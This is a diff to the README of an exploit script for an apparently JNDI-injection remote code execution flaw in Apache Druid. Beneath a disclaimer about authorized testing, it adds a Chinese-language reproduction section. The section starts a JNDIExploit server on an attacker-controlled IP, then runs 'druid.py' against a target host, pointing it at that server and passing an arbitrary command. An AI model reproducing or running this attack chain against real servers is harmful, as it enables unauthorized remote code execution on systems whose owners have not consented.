@@ -39,3 +39,14 @@ To use this script, you need to install Python 3 and the requests library first.
 ## Disclaimer
 This script is for authorized penetration testing or educational purposes only. It is strictly prohibited to use it for illegal purposes;
 When using this script, please comply with local laws and regulations, and ethical standards. You are solely responsible for the risks and consequences caused by using this script;This script may cause irreversible damage to the target server. Use it at your own risk.
+
+# 复现
+启动 [JNDIExploit-1](https://github.com/Avento/JNDIExploit-1)
+```bash
+java -jar JNDIExploit.jar -i 192.168.47.1
+```
+
+执行 poc 脚本
+```bash
+python druid.py -t 192.168.0.1 -j 192.168.0.2 -c "touch /tmp/success"
+```
